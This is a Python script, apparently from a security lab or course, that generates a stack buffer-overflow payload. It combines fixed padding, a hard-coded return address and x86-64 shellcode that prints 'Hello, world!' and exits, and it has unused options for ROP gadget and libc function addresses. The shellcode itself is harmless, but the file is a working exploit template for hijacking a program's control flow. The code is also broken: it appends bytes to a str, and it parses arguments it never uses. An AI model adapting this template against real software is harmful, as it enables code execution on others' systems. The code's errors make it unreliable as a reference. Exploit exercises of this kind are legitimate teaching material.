import argparse
from struct import *


# with open('payload.txt', 'w') as f:
#     f.write()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Generator for payload')
    parser.add_argument(
        '-b', 
        help='number of buffer bytes before',
        type=int,
    )
    parser.add_argument(
        '-s',
        help='string to print out',
        type=str
    )
    parser.add_argument(
        '-g',
        help='gadget address',
        type=str,
    )
    parser.add_argument(
        '-sa',
        help='string address',
        type=str,
    )
    parser.add_argument(
        '-p',
        help='printf address',
        type=str
    )
    parser.add_argument(
        '-e',
        help='exit address',
        type=str,
    )

    args = parser.parse_args()
    
    overall_payload = ''

    # SLED_LENGTH = 24

    # NOP_SLED = b'\x90' * SLED_LENGTH
    
    # command to push, call, then pop
    # BUFFER = b"\xe9\x1e\x00\x00\x00"  
    # BUFFER += b"\xb8\x04\x00\x00\x00"  
    # BUFFER += b"\xbb\x01\x00\x00\x00"  
    # BUFFER += b"\x59"                  
    # BUFFER += b"\xba\x0f\x00\x00\x00"  
    # BUFFER += b"\xcd\x80"              
    # BUFFER += b"\xb8\x01\x00\x00\x00"  
    # BUFFER += b"\xbb\x00\x00\x00\x00"  
    # BUFFER += b"\xcd\x80"              
    # BUFFER += b"\xe8\xdd\xff\xff\xff"  
    # BUFFER += bytes("Hello world!\n".encode())

    # COMMAND = pack("<Q", 0x00005555555551c5)
    # COMMAND += bytes("Hello world!".encode())
    # print(len(BUFFER))

    PADDING = 'X' * 72
    # print('padding len:',len(PADDING))
    # print('buffer:', len(BUFFER))

    # RIP = pack("<Q", 0x555555559670)
    
    # print('RIP:', len(RIP))

    # In order: NOP sled, command, buffer, RIP addr to NOP sled
    overall_payload += PADDING
    overall_payload += pack("<Q", 0x7fffffffde00)
    print('len until bogus:', len(overall_payload))
    
    overall_payload += b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'

    # overall_payload += COMMAND
    # overall_payload += BUFFER
    # overall_payload += bytes(PADDING.encode())
    # overall_payload += RIP

    print('length:', len(overall_payload))

    with open('generated.txt', 'wb') as f:
        f.write(overall_payload)

    print(overall_payload)
